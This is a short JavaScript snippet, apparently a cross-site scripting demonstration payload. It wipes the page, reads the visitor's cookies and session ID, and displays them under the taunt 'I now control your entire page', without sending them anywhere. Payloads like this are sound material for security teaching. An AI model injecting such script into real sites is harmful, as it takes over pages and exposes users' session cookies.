(function () {
    function modifyPage() {
        $("body").remove();
        var newBody, split, cookiesText = "", cookies = {};
        if (document.cookie && document.cookie != '') {
            split = document.cookie.split(';');
            for (var i = 0; i < split.length; i++) {
                var name_value = split[i].split("=");
                name_value[0] = name_value[0].replace(/^ /, '');
                cookies[decodeURIComponent(name_value[0])] = decodeURIComponent(name_value[1]);
            }
        }
        _.each(cookies, function (cookieValue, cookieName) {
            cookiesText += "<li>"+ cookieName + ": " + cookieValue +  "</li>";
        });
        if (cookiesText.length === 0) {
            cookiesText += "<li>Ok, so you don't have any cookies yet. But you will and then you'll come back here and I'll have them!</li>"
        }
        newBody = $("<style>.container { margin: auto; width: 980px;}</style><body><div class='container'>" +
            "<h1>I now control your entire page.</h1>" +
            "<p> I know your secrets... like your cookies and session ID:</p>" +
            "<ul>" + cookiesText + "</ul>" +
            "</div></body>");
        $("html").append(newBody)
    }
    modifyPage();
})();